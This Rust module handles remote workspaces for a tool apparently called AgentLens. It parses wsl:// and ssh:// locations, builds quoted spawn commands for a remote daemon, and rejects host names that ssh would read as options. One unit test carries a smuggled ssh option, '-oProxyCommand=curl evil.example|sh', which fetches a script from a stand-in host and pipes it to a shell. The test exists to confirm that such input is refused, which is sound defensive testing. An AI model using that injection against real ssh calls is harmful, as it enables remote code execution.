//! Naming and reaching machines that aren't this one.
//!
//! Three jobs, all of them local knowledge that `agentlens-core` must not
//! carry: how a remote workspace is written down, how the daemon is spawned
//! there, and how a path on the far side is expressed so a Windows
//! application can open it.

use std::process::Command as ProcessCommand;

use agentlens_core::protocol::{CommandResult, ConnectionTarget};

/// The command AgentLens runs on the far side when nothing overrides it.
/// Bare, so a daemon on the remote `PATH` just works.
pub const DEFAULT_DAEMON_COMMAND: &str = "agentlens-daemon";

/// Write a workspace root down in a way that survives being put in a list of
/// recent workspaces and clicked a week later.
///
/// A bare path means "on this machine". Anything else carries the machine
/// with it, because `/home/h/proj` on two different SSH hosts are two
/// different workspaces and must not share settings or a recents entry.
pub fn format_location(target: &ConnectionTarget, root: &str) -> String {
    match target {
        ConnectionTarget::Local => root.to_string(),
        ConnectionTarget::Wsl { distro } => format!("wsl://{distro}{}", with_leading_slash(root)),
        ConnectionTarget::Ssh { host } => format!("ssh://{host}{}", with_leading_slash(root)),
    }
}

/// The inverse of [`format_location`]. Anything unrecognised is a local path,
/// including Windows drive paths — `C:/x` has a colon but no `//`.
pub fn parse_location(location: &str) -> (ConnectionTarget, String) {
    for (scheme, build) in [
        (
            "wsl://",
            (|name| ConnectionTarget::Wsl { distro: name }) as fn(String) -> _,
        ),
        (
            "ssh://",
            (|name| ConnectionTarget::Ssh { host: name }) as fn(String) -> _,
        ),
    ] {
        if let Some(rest) = location.strip_prefix(scheme) {
            let (name, path) = match rest.find('/') {
                Some(at) => (&rest[..at], &rest[at..]),
                // No path at all: the home directory is the sensible root, and
                // the daemon canonicalizes `~` for us via the shell it isn't
                // using — so send `.` and let it resolve the login directory.
                None => (rest, "."),
            };
            return (build(name.to_string()), path.to_string());
        }
    }
    (ConnectionTarget::Local, location.to_string())
}

fn with_leading_slash(root: &str) -> String {
    if root.starts_with('/') {
        root.to_string()
    } else {
        format!("/{root}")
    }
}

/// The program and arguments that start a daemon for `target`.
///
/// `None` for a local target (there is no process to spawn, the engine is
/// already here) and for a host or distro name that would be read as an
/// option — see [`is_option_like`].
pub fn spawn_spec(target: &ConnectionTarget, daemon: &str) -> Option<(String, Vec<String>)> {
    let daemon = if daemon.trim().is_empty() {
        DEFAULT_DAEMON_COMMAND
    } else {
        daemon.trim()
    };
    match target {
        ConnectionTarget::Local => None,
        // `--` ends wsl.exe's own option parsing, so a daemon path starting
        // with a dash can't be mistaken for a wsl flag. Arguments after it are
        // passed through without a shell, so nothing needs quoting.
        ConnectionTarget::Wsl { distro } => (!is_option_like(distro)).then(|| {
            (
                "wsl.exe".to_string(),
                vec![
                    "-d".to_string(),
                    distro.clone(),
                    "--".to_string(),
                    daemon.to_string(),
                    "--stdio".to_string(),
                ],
            )
        }),
        // ssh concatenates its trailing arguments and hands the result to the
        // remote *shell*, so this one does need quoting.
        ConnectionTarget::Ssh { host } => (!is_option_like(host)).then(|| {
            (
                "ssh".to_string(),
                vec![host.clone(), format!("{} --stdio", shell_quote(daemon))],
            )
        }),
    }
}

/// True for a name that the program being spawned would parse as one of its
/// own options rather than as a host or distro.
///
/// `ssh` has no `--` to end option parsing, so `-oProxyCommand=…` in the host
/// position runs an arbitrary command. Nothing untrusted reaches here today —
/// these names are typed by the user or read back from their own recents — but
/// the whole point of a location string is that it travels, and a check this
/// cheap should not wait for the day one arrives from somewhere else.
fn is_option_like(name: &str) -> bool {
    name.trim().starts_with('-')
}

/// Wrap `value` for a POSIX shell. Single quotes take everything literally,
/// and the only character they can't contain is a single quote — which is
/// spliced in the usual way.
fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

/// Express `path` (absolute, on the far side) so a *Windows* application can
/// open it.
///
/// Only WSL can answer this: Windows exposes a distro's filesystem at
/// `\\wsl$\<distro>\…`. An SSH host has no such bridge, so the caller is told
/// why rather than handed a path that silently opens nothing.
pub fn to_local_path(target: &ConnectionTarget, path: &str) -> CommandResult<String> {
    match target {
        ConnectionTarget::Local => Ok(path.to_string()),
        ConnectionTarget::Wsl { distro } => {
            let trimmed = path.trim_start_matches('/').replace('/', "\\");
            Ok(format!(r"\\wsl$\{distro}\{trimmed}"))
        }
        ConnectionTarget::Ssh { host } => Err(format!(
            "{host} is reached over SSH, so its files have no path this machine can open. \
             Preview and diff work; opening in another application does not."
        )),
    }
}

/// WSL distros installed on this machine, as `wsl.exe -l -q` reports them.
///
/// Empty on anything that isn't Windows, and on a Windows box without WSL —
/// both are "nothing to offer", not errors, because the picker shows this
/// list unconditionally.
pub fn wsl_distros() -> Vec<String> {
    if !cfg!(windows) {
        return Vec::new();
    }
    let Ok(output) = ProcessCommand::new("wsl.exe").args(["-l", "-q"]).output() else {
        return Vec::new();
    };
    if !output.status.success() {
        return Vec::new();
    }
    parse_distro_list(&output.stdout)
}

/// Split `wsl.exe -l -q` output into distro names.
///
/// Split out from the spawning because of the encoding: wsl.exe writes
/// **UTF-16LE**, so the bytes are full of NULs and a naive `from_utf8_lossy`
/// yields a name per replacement character. Both encodings are handled since
/// the behaviour has varied across Windows builds.
fn parse_distro_list(stdout: &[u8]) -> Vec<String> {
    let text = if stdout.iter().skip(1).step_by(2).any(|b| *b == 0) {
        let units: Vec<u16> = stdout
            .chunks_exact(2)
            .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
            .collect();
        String::from_utf16_lossy(&units)
    } else {
        String::from_utf8_lossy(stdout).into_owned()
    };

    text.lines()
        // A UTF-16 BOM and a stray CR both survive `lines()`.
        .map(|line| line.trim_matches(|c: char| c.is_whitespace() || c == '\u{feff}'))
        .filter(|line| !line.is_empty())
        .map(str::to_string)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn wsl(distro: &str) -> ConnectionTarget {
        ConnectionTarget::Wsl {
            distro: distro.to_string(),
        }
    }

    fn ssh(host: &str) -> ConnectionTarget {
        ConnectionTarget::Ssh {
            host: host.to_string(),
        }
    }

    #[test]
    fn locations_round_trip() {
        let cases = [
            (ConnectionTarget::Local, "/home/h/proj"),
            (wsl("Ubuntu"), "/home/h/proj"),
            (ssh("build-box"), "/srv/app"),
        ];
        for (target, root) in cases {
            let location = format_location(&target, root);
            assert_eq!(parse_location(&location), (target, root.to_string()));
        }
    }

    #[test]
    fn a_windows_drive_path_is_local_not_a_scheme() {
        assert_eq!(
            parse_location("C:/Users/h/proj"),
            (ConnectionTarget::Local, "C:/Users/h/proj".to_string())
        );
    }

    #[test]
    fn a_host_with_no_path_resolves_to_the_login_directory() {
        assert_eq!(
            parse_location("ssh://build-box"),
            (ssh("build-box"), ".".to_string())
        );
    }

    #[test]
    fn wsl_spawns_through_the_launcher_with_options_terminated() {
        let (program, args) = spawn_spec(&wsl("Ubuntu-22.04"), "").unwrap();
        assert_eq!(program, "wsl.exe");
        assert_eq!(
            args,
            vec!["-d", "Ubuntu-22.04", "--", "agentlens-daemon", "--stdio"]
        );
    }

    #[test]
    fn ssh_quotes_the_remote_command_for_the_remote_shell() {
        let (program, args) = spawn_spec(&ssh("box"), "/opt/my daemons/agentlens-daemon").unwrap();
        assert_eq!(program, "ssh");
        assert_eq!(args[0], "box");
        assert_eq!(args[1], "'/opt/my daemons/agentlens-daemon' --stdio");

        let (_, args) = spawn_spec(&ssh("box"), "/opt/it's/daemon").unwrap();
        assert_eq!(args[1], r"'/opt/it'\''s/daemon' --stdio");
    }

    #[test]
    fn local_has_nothing_to_spawn() {
        assert!(spawn_spec(&ConnectionTarget::Local, "").is_none());
    }

    #[test]
    fn a_name_that_would_be_read_as_an_option_is_refused() {
        // `ssh -oProxyCommand=… host` runs an arbitrary command, and ssh has
        // no `--` to hide behind.
        assert!(spawn_spec(&ssh("-oProxyCommand=curl evil.example|sh"), "").is_none());
        assert!(spawn_spec(&ssh("  -oBatchMode=no"), "").is_none());
        assert!(spawn_spec(&wsl("--shell-type"), "").is_none());
        // Dashes elsewhere are perfectly ordinary names.
        assert!(spawn_spec(&ssh("build-box"), "").is_some());
        assert!(spawn_spec(&wsl("Ubuntu-22.04"), "").is_some());
    }

    #[test]
    fn wsl_paths_translate_to_the_unc_bridge() {
        assert_eq!(
            to_local_path(&wsl("Ubuntu"), "/home/h/proj/a.txt").unwrap(),
            r"\\wsl$\Ubuntu\home\h\proj\a.txt"
        );
    }

    #[test]
    fn ssh_paths_explain_why_they_cannot_be_opened() {
        let err = to_local_path(&ssh("box"), "/srv/a.txt").unwrap_err();
        assert!(err.contains("box"), "{err}");
    }

    #[test]
    fn distro_lists_are_parsed_from_utf16_and_utf8_alike() {
        let utf16: Vec<u8> = "Ubuntu\r\nDebian\r\n"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        assert_eq!(parse_distro_list(&utf16), vec!["Ubuntu", "Debian"]);

        assert_eq!(
            parse_distro_list(b"\xef\xbb\xbfUbuntu\nDebian\n\n"),
            vec!["Ubuntu", "Debian"]
        );
    }
}
